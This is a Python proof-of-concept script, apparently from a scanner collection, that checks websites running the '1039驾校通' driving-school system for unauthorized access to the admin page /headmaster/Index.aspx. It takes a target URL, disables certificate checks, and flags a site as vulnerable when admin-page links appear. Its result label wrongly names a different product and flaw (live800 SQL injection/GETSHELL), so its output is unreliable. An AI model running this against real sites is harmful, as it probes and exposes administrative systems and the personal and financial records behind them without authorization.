#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 1039驾校通未授权访问漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0132856
author: Lucifer
description: 1039驾校通通用型系统存在未授权漏洞。
'''
import sys
import requests
import warnings
def run(url):
        result = ['live800在线客服系统多处SQL注入/GETSHELL漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/headmaster/Index.aspx"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"ShengQingPS.aspx" in req.text and r"LiuShuiZhang.aspx" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    